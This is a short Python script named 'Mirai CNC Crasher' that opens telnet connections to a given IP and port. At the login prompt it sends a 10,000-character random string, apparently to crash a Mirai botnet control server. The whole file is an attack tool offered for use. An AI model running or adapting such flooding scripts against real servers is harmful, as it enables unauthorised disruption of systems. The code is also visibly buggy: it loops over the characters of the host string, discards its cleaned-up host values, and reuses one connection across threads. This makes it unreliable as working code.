# Mirai CNC Crasher by bolesni

import sys, telnetlib, time, string, random
from threading import Thread
 
def randomString(stringLength=10000):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

filename = sys.argv[0]
""" print (randomString(10000)) """
 
if len(sys.argv) < 3:
    sys.exit("Usage: %s <cnc ip> <cnc port>"%filename)

host = sys.argv[1]
port = sys.argv[2]

timeout = 3
payload = randomString()
tn = telnetlib.Telnet()
 
def conn(crasher):
        tn.open(crasher, port, timeout)
        read = tn.read_all()
        if "sername" in read or "ogin" in read:
            tn.write(payload)

       
for crasher in host:
    crasher.replace("https://", "")
    crasher.replace("http://", "")
    crasher.replace("/", "")
    proc = Thread(target=conn, args=(host,))
    proc.start()
    time.sleep(0.8)
